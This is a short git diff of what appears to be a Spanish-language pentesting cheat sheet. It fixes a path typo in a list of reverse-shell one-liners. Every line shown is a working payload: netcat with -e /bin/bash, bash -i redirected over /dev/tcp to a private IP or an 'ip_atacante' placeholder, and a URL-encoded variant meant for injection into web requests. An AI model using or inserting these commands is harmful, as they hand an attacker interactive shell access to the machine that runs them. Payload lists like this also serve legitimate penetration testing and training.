@@ -89,7 +89,7 @@ done
 ```bash
 nc -e /bin/bash ip_atacante 8080
 
-bin/bash -c 'bash -i >& /dev/tcp/192.168.1.135/6501 0>&1'
+/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.135/6501 0>&1'
 bash -c 'bash -i >& /dev/tcp/ip_atacante/port 0>&1'
 bash -c "bash -i >& /dev/tcp/ip_atacante/port 0>&1"
 bash%20-c%20"bash%20-i%20>%26%20/dev/tcp/ip_atacante/port%200>%261"
